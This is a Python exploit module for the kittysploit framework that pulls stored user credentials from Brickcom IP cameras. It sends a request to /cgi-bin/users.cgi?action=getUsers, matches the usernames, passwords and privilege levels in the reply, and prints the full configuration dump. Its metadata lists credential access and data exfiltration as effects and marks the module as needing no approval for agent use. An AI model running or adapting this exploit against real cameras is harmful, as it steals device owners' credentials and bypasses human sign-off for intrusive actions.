#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Brickcom Camera Credentials Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Brickcom Camera Credentials Disclosure',
        'description': "Exploit implementation for miscellaneous Brickcom cameras with \\'users.cgi\\'.Allows remote credential disclosure by low-privilege user.",
        'author': ['Emiliano Ipar', 'Ignacio Agustin Lizaso', 'Gaston Emanuel Rivadero', 'Josh Abraham'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/42588/', 'https://www.brickcom.com/news/productCERT_security_advisorie.php'],
        'tags': ['iot', 'camera', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")
            print_status("Dumping configuration...")
            print_info(self.configuration)
        else:
            print_error("Exploit failed - target does not appear vulnerable")
    def check(self):
        for username, password in self.credentials:
            response = self.http_request(
                method="GET",
                path="/cgi-bin/users.cgi?action=getUsers",
                auth=(username, password)
            )

            if response is None:
                break

            if any([re.findall(regexp, response.text) for regexp in [r"User1.username=.*", r"User1.password=.*", r"User1.privilege=.*"]]):
                self.configuration = response.text
                return True  # target is vulnerable

        return False  # target is not vulnerable
